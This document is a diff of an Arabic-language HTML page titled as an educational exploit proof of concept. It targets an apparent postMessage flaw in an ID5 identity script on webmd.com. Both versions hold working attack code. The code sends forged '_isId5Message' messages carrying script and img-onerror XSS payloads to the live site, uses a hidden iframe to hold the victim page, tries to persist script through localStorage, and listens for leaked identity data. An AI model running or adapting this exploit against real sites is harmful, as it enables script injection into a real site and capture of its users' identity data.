@@ -1,59 +1,60 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>اختبار الثغرة المخزنة (Stored XSS Test)</title>
+    <title>صفحة اختبار الثغرة - تعليمي</title>
     <style>
-        body { background: #1a1a1a; color: #0f0; font-family: monospace; padding: 20px; }
-        .status { border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; }
-        .detected { color: #ff00ff; font-weight: bold; }
+        body { font-family: sans-serif; background: #f4f4f4; padding: 20px; text-align: center; }
+        .status { color: red; font-weight: bold; margin: 20px; }
+        iframe { width: 0; height: 0; border: none; visibility: hidden; }
     </style>
 </head>
 <body>
-    <h2>جاري فحص إمكانية تحويل الثغرة إلى Stored...</h2>
-    <div id="status" class="status">بدء العملية...</div>
-    <div id="logs"></div>
+    <h1>صفحة اختبار اختراق (Exploit PoC)</h1>
+    <p>هذه الصفحة تحاكي هجوم <b>DOM-based XSS</b> عبر ثغرة <code>postMessage</code>.</p>
+    <div id="log" class="status">جاري تشغيل الهجوم...</div>
+
+    <iframe id="victimFrame" src="https://www.webmd.com/"></iframe>
 
     <script>
-        let victimWindow;
-        const log = (msg, isSpecial = false) => {
-            const div = document.getElementById('logs');
-            div.innerHTML += `<p class="${isSpecial ? 'detected' : ''}">[${new Date().toLocaleTimeString()}] ${msg}</p>`;
-        };
+        const victimWindow = document.getElementById('victimFrame').contentWindow;
 
-        // 1. تشغيل الهجوم
-        function launchStoredTest() {
-            log("فتح نافذة الضحية...");
-            victimWindow = window.open("https://www.webmd.com", "VictimSite");
-
-            setTimeout(() => {
-                log("محاولة حقن كود تتبع في التخزين المحلي (LocalStorage)...");
-                
-                // الـ Payload هنا يحاول كتابة نفسه داخل الـ LocalStorage الخاص بالضحية
-                const payload = {
-                    _isId5Message: true,
-                    type: "ID5_STORAGE_UPDATE", 
-                    payload: {
-                        // كود يحاول التنفيذ وتخزين نفسه
-                        identity: "STORED_XSS_TEST_DATA",
-                        scripts: "<script>localStorage.setItem('hacked', 'true'); console.log('Stored Successful');<\/script>"
-                    }
-                };
-
-                victimWindow.postMessage(payload, "*");
-                log("تم إرسال الـ Payload. انتظر 10 ثوانٍ...");
-            }, 5000);
-
-            // 2. فحص الاستجابة (هل الموقع سرب البيانات المخزنة؟)
-            window.addEventListener("message", (event) => {
-                if (event.data && JSON.stringify(event.data).includes("STORED_XSS_TEST_DATA")) {
-                    log("!!! تأكيد: الموقع استقبل البيانات وقام بمعالجتها !!!", true);
-                    log("الآن قم بتحديث صفحة الضحية يدوياً، إذا وجدنا 'hacked' في الـ LocalStorage فهي Stored!");
+        // دالة لإرسال الرسالة المفخخة
+        function launchExploit() {
+            console.log("إرسال الحمولة (Payload)...");
+            
+            const payload = {
+                _isId5Message: true, // تخطي فحص الهوية في الكود المصاب
+                src: "attacker-id",  // أي معرف وهمي
+                type: "PROXY_METHOD_CALL", // استهداف معالج البروكسي
+                payload: {
+                    // هنا يتم حقن الكود. إذا كان الموقع يستخدم هذا الحقل في DOM
+                    // سيتم تنفيذ الـ alert فوراً.
+                    name: "test",
+                    args: ["<img src=x onerror=\"alert('تم اختراق الموقع بنجاح! \\n\\n المصدر: ' + document.domain);\">"]
                 }
-            });
+            };
+
+            // إرسال الرسالة مع استخدام "*" لاستغلال الثغرة
+            victimWindow.postMessage(payload, "*");
+            
+            document.getElementById('log').innerText = "تم إرسال الرسالة! افحص إطار المتصفح.";
         }
 
-        window.onload = launchStoredTest;
+        // الانتظار حتى يتم تحميل صفحة الضحية تماماً
+        window.onload = () => {
+            setTimeout(launchExploit, 3000); // مهلة 3 ثوانٍ للتأكد من تحميل الـ Scripts
+        };
+
+        // محاولة اعتراض بيانات الهوية المسربة (Exfiltration)
+        window.addEventListener("message", (event) => {
+            // بما أن الكود المصاب يستخدم "*" و يقوم بعمل Broadcast لجميع الإطارات،
+            // المهاجم يمكنه سماع الرسائل المسربة هنا.
+            if (event.data && event.data._isId5Message) {
+                console.log("تم اعتراض بيانات مسربة من الموقع:", event.data);
+                document.getElementById('log').innerHTML += `<br>تم اعتراض بيانات: ${JSON.stringify(event.data)}`;
+            }
+        });
     </script>
 </body>
 </html>
